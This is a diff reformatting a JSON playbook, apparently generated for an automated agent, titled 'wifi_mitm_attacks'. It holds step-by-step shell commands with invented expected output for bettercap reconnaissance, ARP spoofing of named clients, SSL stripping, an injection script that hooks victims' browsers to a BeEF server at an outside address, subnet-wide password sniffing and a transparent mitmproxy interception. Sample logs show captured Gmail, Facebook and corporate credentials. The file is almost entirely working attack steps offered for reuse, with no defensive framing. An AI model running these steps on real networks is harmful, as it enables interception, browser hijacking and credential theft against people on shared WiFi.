@@ -2,37 +2,131 @@
   "name": "wifi_mitm_attacks",
   "description": "Man-in-the-Middle attacks on WiFi networks using bettercap and SSL stripping",
   "pattern": "wifi.*mitm|bettercap|sslstrip|arp.*spoof|mitm.*wifi",
-  "parameters": ["interface", "gateway", "target"],
+  "parameters": [
+    "interface",
+    "gateway",
+    "target"
+  ],
   "sequence": [
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bettercap", "args": ["-iface", "wlan0"]},
-      "expected_output": {"type": "string", "example": "bettercap v2.32.0 (built for linux amd64 with go1.19.1)\n\n[15:45:00] [sys.log] [inf] wlan0 » 192.168.10.50/24 (gateway: 192.168.10.1)\n[15:45:00] [sys.log] [inf] enabling monitor mode ...\n[15:45:01] [sys.log] [inf] wifi.recon on\n[15:45:01] [sys.log] [inf] wifi » wifi recon started\n[15:45:02] [sys.log] [inf] wifi.recon » OfficeMain (DD:EE:FF:00:11:22) detected 5 clients\n[15:45:03] [sys.log] [inf] wifi.recon » CorporateWiFi (AA:BB:CC:DD:EE:FF) detected 2 clients\n\n192.168.10.1/24 > \n\nbettercap started:\n  Interface: wlan0\n  Local IP: 192.168.10.50\n  Gateway: 192.168.10.1\n  WiFi reconnaissance active\n  \nNetworks discovered:\n  - OfficeMain (5 clients)\n  - CorporateWiFi (2 clients)\n  \nbettercap interactive shell ready\nType 'help' for commands\n  \nCommon commands:\n  net.probe on           # Active network probing\n  net.recon on           # Passive reconnaissance  \n  wifi.recon on          # WiFi scanning\n  arp.spoof on           # ARP spoofing MITM\n  http.proxy on          # HTTP proxy for injection\n  https.proxy on         # HTTPS proxy (SSL strip)"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bettercap",
+        "args": [
+          "-iface",
+          "wlan0"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "bettercap v2.32.0 (built for linux amd64 with go1.19.1)\n\n[15:45:00] [sys.log] [inf] wlan0 » 192.168.10.50/24 (gateway: 192.168.10.1)\n[15:45:00] [sys.log] [inf] enabling monitor mode ...\n[15:45:01] [sys.log] [inf] wifi.recon on\n[15:45:01] [sys.log] [inf] wifi » wifi recon started\n[15:45:02] [sys.log] [inf] wifi.recon » OfficeMain (DD:EE:FF:00:11:22) detected 5 clients\n[15:45:03] [sys.log] [inf] wifi.recon » CorporateWiFi (AA:BB:CC:DD:EE:FF) detected 2 clients\n\n192.168.10.1/24 > \n\nbettercap started:\n  Interface: wlan0\n  Local IP: 192.168.10.50\n  Gateway: 192.168.10.1\n  WiFi reconnaissance active\n  \nNetworks discovered:\n  - OfficeMain (5 clients)\n  - CorporateWiFi (2 clients)\n  \nbettercap interactive shell ready\nType 'help' for commands\n  \nCommon commands:\n  net.probe on           # Active network probing\n  net.recon on           # Passive reconnaissance  \n  wifi.recon on          # WiFi scanning\n  arp.spoof on           # ARP spoofing MITM\n  http.proxy on          # HTTP proxy for injection\n  https.proxy on         # HTTPS proxy (SSL strip)"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "echo 'net.probe on' | bettercap -iface wlan0 && sleep 5 && echo 'net.show' | bettercap -iface wlan0"]},
-      "expected_output": {"type": "string", "example": "[15:46:00] [sys.log] [inf] net.probe » probing network ...\n[15:46:01] [endpoint.new] endpoint 192.168.10.1 detected as gateway (DD:EE:FF:00:11:22)\n[15:46:02] [endpoint.new] endpoint 192.168.10.15 detected as AB:CD:EF:12:34:56\n[15:46:03] [endpoint.new] endpoint 192.168.10.18 detected as 56:78:90:AB:CD:EF\n[15:46:04] [endpoint.new] endpoint 192.168.10.23 detected as 98:76:54:32:10:FE\n\n┌───────────────┬───────────────────┬─────────────────┬─────────┬────────┬──────────────────┐\n│      IP ▴     │        MAC        │      Name       │  Vendor │  Sent  │     Received     │\n├───────────────┼───────────────────┼─────────────────┼─────────┼────────┼──────────────────┤\n│ 192.168.10.1  │ DD:EE:FF:00:11:22 │ gateway         │ Linksys │ 0 B    │ 0 B              │\n│ 192.168.10.15 │ AB:CD:EF:12:34:56 │ DESKTOP-ABC123  │ Dell    │ 1.2 kB │ 847 B            │\n│ 192.168.10.18 │ 56:78:90:AB:CD:EF │ iPhone-John     │ Apple   │ 2.4 kB │ 1.8 kB           │\n│ 192.168.10.23 │ 98:76:54:32:10:FE │ android-samsung │ Samsung │ 956 B  │ 1.1 kB           │\n│ 192.168.10.50 │ 08:00:27:8D:C0:4D │ this device     │ Realtek │ 0 B    │ 0 B              │\n└───────────────┴───────────────────┴─────────────────┴─────────┴────────┴──────────────────┘\n\nNetwork enumeration:\n  Total hosts: 5 (including us)\n  Gateway: 192.168.10.1 (Linksys router)\n  \nActive clients:\n  1. DESKTOP-ABC123 (192.168.10.15) - Dell Windows PC\n  2. iPhone-John (192.168.10.18) - Apple iPhone\n  3. android-samsung (192.168.10.23) - Samsung Android\n  \nVendor fingerprinting:\n  - Dell, Apple, Samsung identified\n  - Helps determine OS and vulnerabilities\n  \nReady for MITM:\n  Targets identified\n  Can ARP spoof any client"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "echo 'net.probe on' | bettercap -iface wlan0 && sleep 5 && echo 'net.show' | bettercap -iface wlan0"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "[15:46:00] [sys.log] [inf] net.probe » probing network ...\n[15:46:01] [endpoint.new] endpoint 192.168.10.1 detected as gateway (DD:EE:FF:00:11:22)\n[15:46:02] [endpoint.new] endpoint 192.168.10.15 detected as AB:CD:EF:12:34:56\n[15:46:03] [endpoint.new] endpoint 192.168.10.18 detected as 56:78:90:AB:CD:EF\n[15:46:04] [endpoint.new] endpoint 192.168.10.23 detected as 98:76:54:32:10:FE\n\n┌───────────────┬───────────────────┬─────────────────┬─────────┬────────┬──────────────────┐\n│      IP ▴     │        MAC        │      Name       │  Vendor │  Sent  │     Received     │\n├───────────────┼───────────────────┼─────────────────┼─────────┼────────┼──────────────────┤\n│ 192.168.10.1  │ DD:EE:FF:00:11:22 │ gateway         │ Linksys │ 0 B    │ 0 B              │\n│ 192.168.10.15 │ AB:CD:EF:12:34:56 │ DESKTOP-ABC123  │ Dell    │ 1.2 kB │ 847 B            │\n│ 192.168.10.18 │ 56:78:90:AB:CD:EF │ iPhone-John     │ Apple   │ 2.4 kB │ 1.8 kB           │\n│ 192.168.10.23 │ 98:76:54:32:10:FE │ android-samsung │ Samsung │ 956 B  │ 1.1 kB           │\n│ 192.168.10.50 │ 08:00:27:8D:C0:4D │ this device     │ Realtek │ 0 B    │ 0 B              │\n└───────────────┴───────────────────┴─────────────────┴─────────┴────────┴──────────────────┘\n\nNetwork enumeration:\n  Total hosts: 5 (including us)\n  Gateway: 192.168.10.1 (Linksys router)\n  \nActive clients:\n  1. DESKTOP-ABC123 (192.168.10.15) - Dell Windows PC\n  2. iPhone-John (192.168.10.18) - Apple iPhone\n  3. android-samsung (192.168.10.23) - Samsung Android\n  \nVendor fingerprinting:\n  - Dell, Apple, Samsung identified\n  - Helps determine OS and vulnerabilities\n  \nReady for MITM:\n  Targets identified\n  Can ARP spoof any client"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "cat > mitm.cap << 'EOF'\nnet.probe on\nsleep 3\nset arp.spoof.targets 192.168.10.15,192.168.10.18\narp.spoof on\nnet.sniff on\nEOF\nbettercap -iface wlan0 -caplet mitm.cap"]},
-      "expected_output": {"type": "string", "example": "[15:47:00] [sys.log] [inf] net.probe » network probing started\n[15:47:03] [sys.log] [inf] arp.spoof » targets: [192.168.10.15, 192.168.10.18]\n[15:47:03] [sys.log] [inf] arp.spoof » ARP spoofing started\n[15:47:03] [arp.spoof] poisoning 192.168.10.15 (AB:CD:EF:12:34:56) and gateway\n[15:47:03] [arp.spoof] poisoning 192.168.10.18 (56:78:90:AB:CD:EF) and gateway\n[15:47:04] [sys.log] [inf] net.sniff » packet sniffer started\n\n[Captured traffic:]\n[15:47:05] [net.sniff] HTTP > GET http://news.site.com/ (Host: news.site.com)\n[15:47:06] [net.sniff] HTTP > GET http://api.weather.com/forecast (Host: api.weather.com)\n[15:47:08] [net.sniff] DNS > DESKTOP-ABC123 querying mail.google.com\n[15:47:10] [net.sniff] HTTP > POST http://login.example.com/auth (username=john.doe&password=JohnPass123!)\n[15:47:15] [net.sniff] TLS > iPhone-John » encrypted traffic to api.apple.com:443\n\nARP spoofing MITM active!\n  Targets: 2 clients\n    - 192.168.10.15 (DESKTOP-ABC123)\n    - 192.168.10.18 (iPhone-John)\n  \nARP poisoning:\n  Tell clients: \"I am the gateway\"\n  Tell gateway: \"I am the client\"\n  Result: All traffic flows through us\n  \nTraffic captured:\n  - HTTP requests (unencrypted)\n  - DNS queries\n  - POST data with credentials!\n    username: john.doe\n    password: JohnPass123!\n  - HTTPS (encrypted, need SSL strip)\n  \nPacket sniffer active:\n  All traffic logged\n  Credentials in cleartext HTTP captured\n  \nbettercap caplet:\n  Automated attack sequence\n  Reusable configuration"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "cat > mitm.cap << 'EOF'\nnet.probe on\nsleep 3\nset arp.spoof.targets 192.168.10.15,192.168.10.18\narp.spoof on\nnet.sniff on\nEOF\nbettercap -iface wlan0 -caplet mitm.cap"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "[15:47:00] [sys.log] [inf] net.probe » network probing started\n[15:47:03] [sys.log] [inf] arp.spoof » targets: [192.168.10.15, 192.168.10.18]\n[15:47:03] [sys.log] [inf] arp.spoof » ARP spoofing started\n[15:47:03] [arp.spoof] poisoning 192.168.10.15 (AB:CD:EF:12:34:56) and gateway\n[15:47:03] [arp.spoof] poisoning 192.168.10.18 (56:78:90:AB:CD:EF) and gateway\n[15:47:04] [sys.log] [inf] net.sniff » packet sniffer started\n\n[Captured traffic:]\n[15:47:05] [net.sniff] HTTP > GET http://news.site.com/ (Host: news.site.com)\n[15:47:06] [net.sniff] HTTP > GET http://api.weather.com/forecast (Host: api.weather.com)\n[15:47:08] [net.sniff] DNS > DESKTOP-ABC123 querying mail.google.com\n[15:47:10] [net.sniff] HTTP > POST http://login.example.com/auth (username=john.doe&password=JohnPass123!)\n[15:47:15] [net.sniff] TLS > iPhone-John » encrypted traffic to api.apple.com:443\n\nARP spoofing MITM active!\n  Targets: 2 clients\n    - 192.168.10.15 (DESKTOP-ABC123)\n    - 192.168.10.18 (iPhone-John)\n  \nARP poisoning:\n  Tell clients: \"I am the gateway\"\n  Tell gateway: \"I am the client\"\n  Result: All traffic flows through us\n  \nTraffic captured:\n  - HTTP requests (unencrypted)\n  - DNS queries\n  - POST data with credentials!\n    username: john.doe\n    password: JohnPass123!\n  - HTTPS (encrypted, need SSL strip)\n  \nPacket sniffer active:\n  All traffic logged\n  Credentials in cleartext HTTP captured\n  \nbettercap caplet:\n  Automated attack sequence\n  Reusable configuration"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "cat > sslstrip.cap << 'EOF'\nnet.probe on\nsleep 2\nset arp.spoof.targets 192.168.10.15\nset http.proxy.sslstrip true\nset https.proxy.sslstrip true\narp.spoof on\nhttp.proxy on\nhttps.proxy on\nnet.sniff on\nEOF\nbettercap -iface wlan0 -caplet sslstrip.cap"]},
-      "expected_output": {"type": "string", "example": "[15:48:00] [sys.log] [inf] http.proxy » SSL stripping enabled\n[15:48:00] [sys.log] [inf] https.proxy » SSL stripping enabled\n[15:48:01] [sys.log] [inf] arp.spoof » poisoning 192.168.10.15\n[15:48:01] [sys.log] [inf] http.proxy » proxy started on 0.0.0.0:8080\n[15:48:01] [sys.log] [inf] https.proxy » proxy started on 0.0.0.0:8083\n[15:48:02] [sys.log] [inf] net.sniff » started\n\n[SSL Strip in action:]\n[15:48:10] [https.proxy] 192.168.10.15 > https://mail.google.com → http://mail.google.com (stripped!)\n[15:48:15] [http.proxy] 192.168.10.15 > POST http://mail.google.com/login\n[15:48:15] [http.proxy] email=john.doe@company.com&password=GooglePass2024!\n[15:48:20] [https.proxy] 192.168.10.15 > https://facebook.com → http://facebook.com (stripped!)\n[15:48:25] [http.proxy] 192.168.10.15 > POST http://facebook.com/login.php\n[15:48:25] [http.proxy] email=john.doe@email.com&pass=FacebookPass123\n\nSSL Stripping attack active!\n  Target: 192.168.10.15\n  \nHow SSL Strip works:\n  1. Client requests: https://mail.google.com\n  2. We (MITM) connect to server via HTTPS\n  3. We send HTTP to client (downgrade)\n  4. Client thinks it's HTTP (no encryption)\n  5. We capture cleartext credentials\n  6. We forward to real HTTPS server\n  \nCredentials captured:\n  - Gmail: john.doe@company.com / GooglePass2024!\n  - Facebook: john.doe@email.com / FacebookPass123\n  \nVictim sees:\n  - http://mail.google.com (no padlock icon)\n  - http://facebook.com (insecure warning maybe ignored)\n  - Pages load normally (content from real servers)\n  \nSSL strip bypasses encryption:\n  - HTTPS → HTTP downgrade\n  - All credentials in plaintext\n  - Perfect for WiFi MITM"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "cat > sslstrip.cap << 'EOF'\nnet.probe on\nsleep 2\nset arp.spoof.targets 192.168.10.15\nset http.proxy.sslstrip true\nset https.proxy.sslstrip true\narp.spoof on\nhttp.proxy on\nhttps.proxy on\nnet.sniff on\nEOF\nbettercap -iface wlan0 -caplet sslstrip.cap"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "[15:48:00] [sys.log] [inf] http.proxy » SSL stripping enabled\n[15:48:00] [sys.log] [inf] https.proxy » SSL stripping enabled\n[15:48:01] [sys.log] [inf] arp.spoof » poisoning 192.168.10.15\n[15:48:01] [sys.log] [inf] http.proxy » proxy started on 0.0.0.0:8080\n[15:48:01] [sys.log] [inf] https.proxy » proxy started on 0.0.0.0:8083\n[15:48:02] [sys.log] [inf] net.sniff » started\n\n[SSL Strip in action:]\n[15:48:10] [https.proxy] 192.168.10.15 > https://mail.google.com → http://mail.google.com (stripped!)\n[15:48:15] [http.proxy] 192.168.10.15 > POST http://mail.google.com/login\n[15:48:15] [http.proxy] email=john.doe@company.com&password=GooglePass2024!\n[15:48:20] [https.proxy] 192.168.10.15 > https://facebook.com → http://facebook.com (stripped!)\n[15:48:25] [http.proxy] 192.168.10.15 > POST http://facebook.com/login.php\n[15:48:25] [http.proxy] email=john.doe@email.com&pass=FacebookPass123\n\nSSL Stripping attack active!\n  Target: 192.168.10.15\n  \nHow SSL Strip works:\n  1. Client requests: https://mail.google.com\n  2. We (MITM) connect to server via HTTPS\n  3. We send HTTP to client (downgrade)\n  4. Client thinks it's HTTP (no encryption)\n  5. We capture cleartext credentials\n  6. We forward to real HTTPS server\n  \nCredentials captured:\n  - Gmail: john.doe@company.com / GooglePass2024!\n  - Facebook: john.doe@email.com / FacebookPass123\n  \nVictim sees:\n  - http://mail.google.com (no padlock icon)\n  - http://facebook.com (insecure warning maybe ignored)\n  - Pages load normally (content from real servers)\n  \nSSL strip bypasses encryption:\n  - HTTPS → HTTP downgrade\n  - All credentials in plaintext\n  - Perfect for WiFi MITM"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "cat > inject.cap << 'EOF'\nnet.probe on\nset arp.spoof.targets 192.168.10.15\nset http.proxy.script /root/inject.js\narp.spoof on\nhttp.proxy on\nnet.sniff on\nEOF\n\ncat > /root/inject.js << 'JSEOF'\nfunction onResponse(req, res) {\n  if(res.ContentType.indexOf('text/html') == 0) {\n    var body = res.ReadBody();\n    if(body.indexOf('</body>') != -1) {\n      var beef = '<script src=\"http://10.10.14.50:3000/hook.js\"></script>';\n      body = body.replace('</body>', beef + '</body>');\n      res.SetBody(body);\n    }\n  }\n}\nJSEOF\n\nbettercap -iface wlan0 -caplet inject.cap"]},
-      "expected_output": {"type": "string", "example": "[15:50:00] [sys.log] [inf] http.proxy.script » /root/inject.js loaded\n[15:50:01] [sys.log] [inf] http.proxy » proxy started with injection script\n[15:50:02] [sys.log] [inf] arp.spoof » poisoning 192.168.10.15\n\n[Traffic interception and injection:]\n[15:50:10] [http.proxy] 192.168.10.15 > GET http://news.site.com/\n[15:50:10] [http.proxy.script] injecting BeEF hook into response\n[15:50:10] [http.proxy] → modified response sent to client\n[15:50:15] [http.proxy] 192.168.10.15 > GET http://shopping.com/products\n[15:50:15] [http.proxy.script] injecting BeEF hook into response\n[15:50:15] [http.proxy] → modified response sent to client\n\n[On BeEF server:]\n[15:50:11] [hook] New browser hooked: 192.168.10.15\n[15:50:11] [hook] Browser: Chrome 120.0 on Windows 10\n[15:50:11] [hook] Origin: http://news.site.com\n\nJavaScript injection via MITM!\n  Injection script: /root/inject.js\n  Target: 192.168.10.15\n  \nInjection process:\n  1. Intercept HTTP responses\n  2. Check if HTML content\n  3. Find </body> tag\n  4. Inject BeEF hook before </body>\n  5. Send modified response to victim\n  \nPayload injected:\n  <script src=\"http://10.10.14.50:3000/hook.js\"></script>\n  \nResult:\n  - Every HTTP page loaded by victim includes BeEF\n  - Browser is hooked automatically\n  - Full BeEF capabilities available\n  - Can inject:\n    * BeEF hooks\n    * Keyloggers\n    * Fake login forms\n    * Cryptocurrency miners\n    * Exploit code\n  \nVictim experience:\n  - Pages load normally\n  - No visible indication of injection\n  - JavaScript executes silently\n  - Complete browser compromise"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "cat > inject.cap << 'EOF'\nnet.probe on\nset arp.spoof.targets 192.168.10.15\nset http.proxy.script /root/inject.js\narp.spoof on\nhttp.proxy on\nnet.sniff on\nEOF\n\ncat > /root/inject.js << 'JSEOF'\nfunction onResponse(req, res) {\n  if(res.ContentType.indexOf('text/html') == 0) {\n    var body = res.ReadBody();\n    if(body.indexOf('</body>') != -1) {\n      var beef = '<script src=\"http://10.10.14.50:3000/hook.js\"></script>';\n      body = body.replace('</body>', beef + '</body>');\n      res.SetBody(body);\n    }\n  }\n}\nJSEOF\n\nbettercap -iface wlan0 -caplet inject.cap"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "[15:50:00] [sys.log] [inf] http.proxy.script » /root/inject.js loaded\n[15:50:01] [sys.log] [inf] http.proxy » proxy started with injection script\n[15:50:02] [sys.log] [inf] arp.spoof » poisoning 192.168.10.15\n\n[Traffic interception and injection:]\n[15:50:10] [http.proxy] 192.168.10.15 > GET http://news.site.com/\n[15:50:10] [http.proxy.script] injecting BeEF hook into response\n[15:50:10] [http.proxy] → modified response sent to client\n[15:50:15] [http.proxy] 192.168.10.15 > GET http://shopping.com/products\n[15:50:15] [http.proxy.script] injecting BeEF hook into response\n[15:50:15] [http.proxy] → modified response sent to client\n\n[On BeEF server:]\n[15:50:11] [hook] New browser hooked: 192.168.10.15\n[15:50:11] [hook] Browser: Chrome 120.0 on Windows 10\n[15:50:11] [hook] Origin: http://news.site.com\n\nJavaScript injection via MITM!\n  Injection script: /root/inject.js\n  Target: 192.168.10.15\n  \nInjection process:\n  1. Intercept HTTP responses\n  2. Check if HTML content\n  3. Find </body> tag\n  4. Inject BeEF hook before </body>\n  5. Send modified response to victim\n  \nPayload injected:\n  <script src=\"http://10.10.14.50:3000/hook.js\"></script>\n  \nResult:\n  - Every HTTP page loaded by victim includes BeEF\n  - Browser is hooked automatically\n  - Full BeEF capabilities available\n  - Can inject:\n    * BeEF hooks\n    * Keyloggers\n    * Fake login forms\n    * Cryptocurrency miners\n    * Exploit code\n  \nVictim experience:\n  - Pages load normally\n  - No visible indication of injection\n  - JavaScript executes silently\n  - Complete browser compromise"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "cat > credentials.cap << 'EOF'\nnet.probe on\nset arp.spoof.targets 192.168.10.0/24\nset net.sniff.regexp '.*password=.*|.*passwd=.*|.*pwd=.*|.*pass=.*'\narp.spoof on\nnet.sniff on\nEOF\nbettercap -iface wlan0 -caplet credentials.cap"]},
-      "expected_output": {"type": "string", "example": "[15:52:00] [sys.log] [inf] arp.spoof » targeting entire subnet: 192.168.10.0/24\n[15:52:01] [sys.log] [inf] net.sniff » regex filter: .*password=.*|.*passwd=.*|.*pwd=.*|.*pass=.*\n[15:52:01] [sys.log] [inf] arp.spoof » poisoning 15 targets\n[15:52:02] [sys.log] [inf] net.sniff » filtering for credentials\n\n[Credentials captured:]\n[15:52:15] [net.sniff] 192.168.10.15 > POST http://login.example.com/auth\n[15:52:15] [net.sniff] MATCH: username=john.doe&password=JohnPass123!\n\n[15:52:45] [net.sniff] 192.168.10.18 > POST http://forum.site.com/login\n[15:52:45] [net.sniff] MATCH: user=jane_smith&pass=SmithPassword2024\n\n[15:53:10] [net.sniff] 192.168.10.23 > POST http://mail.corporate.com/auth\n[15:53:10] [net.sniff] MATCH: email=admin@company.com&password=AdminCorp2024!\n\n[15:53:35] [net.sniff] 192.168.10.27 > POST http://intranet.local/login\n[15:53:35] [net.sniff] MATCH: username=support&pwd=Support@Pass123\n\nMass credential harvesting:\n  Targets: Entire subnet (192.168.10.0/24)\n  Filter: Regex for password fields\n  \nRegex pattern matches:\n  - password=...\n  - passwd=...\n  - pwd=...\n  - pass=...\n  \nCredentials captured (4):\n  1. john.doe / JohnPass123! (login.example.com)\n  2. jane_smith / SmithPassword2024 (forum.site.com)\n  3. admin@company.com / AdminCorp2024! (mail.corporate.com)\n  4. support / Support@Pass123 (intranet.local)\n  \nMass MITM on WiFi network:\n  - ARP spoof all clients\n  - Filter traffic for credentials only\n  - Capture passwords from:\n    * Login forms\n    * API requests\n    * Basic auth\n    * Any POST with password field\n  \nEfficiency:\n  - Regex filtering reduces noise\n  - Only credential-related traffic logged\n  - Easy to parse and use"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "cat > credentials.cap << 'EOF'\nnet.probe on\nset arp.spoof.targets 192.168.10.0/24\nset net.sniff.regexp '.*password=.*|.*passwd=.*|.*pwd=.*|.*pass=.*'\narp.spoof on\nnet.sniff on\nEOF\nbettercap -iface wlan0 -caplet credentials.cap"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "[15:52:00] [sys.log] [inf] arp.spoof » targeting entire subnet: 192.168.10.0/24\n[15:52:01] [sys.log] [inf] net.sniff » regex filter: .*password=.*|.*passwd=.*|.*pwd=.*|.*pass=.*\n[15:52:01] [sys.log] [inf] arp.spoof » poisoning 15 targets\n[15:52:02] [sys.log] [inf] net.sniff » filtering for credentials\n\n[Credentials captured:]\n[15:52:15] [net.sniff] 192.168.10.15 > POST http://login.example.com/auth\n[15:52:15] [net.sniff] MATCH: username=john.doe&password=JohnPass123!\n\n[15:52:45] [net.sniff] 192.168.10.18 > POST http://forum.site.com/login\n[15:52:45] [net.sniff] MATCH: user=jane_smith&pass=SmithPassword2024\n\n[15:53:10] [net.sniff] 192.168.10.23 > POST http://mail.corporate.com/auth\n[15:53:10] [net.sniff] MATCH: email=admin@company.com&password=AdminCorp2024!\n\n[15:53:35] [net.sniff] 192.168.10.27 > POST http://intranet.local/login\n[15:53:35] [net.sniff] MATCH: username=support&pwd=Support@Pass123\n\nMass credential harvesting:\n  Targets: Entire subnet (192.168.10.0/24)\n  Filter: Regex for password fields\n  \nRegex pattern matches:\n  - password=...\n  - passwd=...\n  - pwd=...\n  - pass=...\n  \nCredentials captured (4):\n  1. john.doe / JohnPass123! (login.example.com)\n  2. jane_smith / SmithPassword2024 (forum.site.com)\n  3. admin@company.com / AdminCorp2024! (mail.corporate.com)\n  4. support / Support@Pass123 (intranet.local)\n  \nMass MITM on WiFi network:\n  - ARP spoof all clients\n  - Filter traffic for credentials only\n  - Capture passwords from:\n    * Login forms\n    * API requests\n    * Basic auth\n    * Any POST with password field\n  \nEfficiency:\n  - Regex filtering reduces noise\n  - Only credential-related traffic logged\n  - Easy to parse and use"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "mitmproxy", "args": ["-T", "--host", "--anticache"]},
-      "expected_output": {"type": "string", "example": "Proxy server listening at http://*:8080\n\nmitmproxy started:\n  Mode: Transparent proxy (-T)\n  Host header: Preserve original host (--host)\n  Cache: Disabled (--anticache)\n  Listening: 0.0.0.0:8080\n  \nSetup iptables forwarding:\n  iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 8080\n  iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j REDIRECT --to-port 8080\n  \nAll HTTP/HTTPS traffic from wlan0 → mitmproxy\n\n[When clients browse:]\n[15:55:10] 192.168.10.15:52341 → GET http://news.site.com/\n[15:55:15] 192.168.10.15:52342 → POST http://login.example.com/auth\n           username: john.doe\n           password: JohnPass123!\n[15:55:20] 192.168.10.18:43251 → GET https://mail.google.com/ (SSL)\n[15:55:25] 192.168.10.18:43252 → POST https://mail.google.com/login (SSL)\n           email: jane@company.com  \n           password: GooglePass2024!\n\nmitmproxy interactive interface:\n  - See all HTTP/HTTPS requests in real-time\n  - Inspect headers, body, cookies\n  - Modify requests/responses\n  - Save flows for later analysis\n  - Export to curl, httpie, etc.\n  \nFeatures:\n  - SSL interception with custom CA cert\n  - Request/response modification\n  - Scripting support (Python)\n  - Flow replay\n  - Content filtering\n  \nCommands:\n  i: Intercept requests\n  f: Filter flows\n  e: Export flow\n  q: Quit\n  \nFor HTTPS:\n  Need to install mitmproxy CA cert on client\n  Or use SSL strip attack"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "mitmproxy",
+        "args": [
+          "-T",
+          "--host",
+          "--anticache"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "Proxy server listening at http://*:8080\n\nmitmproxy started:\n  Mode: Transparent proxy (-T)\n  Host header: Preserve original host (--host)\n  Cache: Disabled (--anticache)\n  Listening: 0.0.0.0:8080\n  \nSetup iptables forwarding:\n  iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 8080\n  iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j REDIRECT --to-port 8080\n  \nAll HTTP/HTTPS traffic from wlan0 → mitmproxy\n\n[When clients browse:]\n[15:55:10] 192.168.10.15:52341 → GET http://news.site.com/\n[15:55:15] 192.168.10.15:52342 → POST http://login.example.com/auth\n           username: john.doe\n           password: JohnPass123!\n[15:55:20] 192.168.10.18:43251 → GET https://mail.google.com/ (SSL)\n[15:55:25] 192.168.10.18:43252 → POST https://mail.google.com/login (SSL)\n           email: jane@company.com  \n           password: GooglePass2024!\n\nmitmproxy interactive interface:\n  - See all HTTP/HTTPS requests in real-time\n  - Inspect headers, body, cookies\n  - Modify requests/responses\n  - Save flows for later analysis\n  - Export to curl, httpie, etc.\n  \nFeatures:\n  - SSL interception with custom CA cert\n  - Request/response modification\n  - Scripting support (Python)\n  - Flow replay\n  - Content filtering\n  \nCommands:\n  i: Intercept requests\n  f: Filter flows\n  e: Export flow\n  q: Quit\n  \nFor HTTPS:\n  Need to install mitmproxy CA cert on client\n  Or use SSL strip attack"
+      }
     }
   ],
-  "stats": {"uses": 0, "successes": 0, "failures": 0, "success_rate": 0.0},
+  "stats": {
+    "uses": 0,
+    "successes": 0,
+    "failures": 0,
+    "success_rate": 0.0
+  },
   "created_by": "neural_mesh_v5.2_generator"
 }
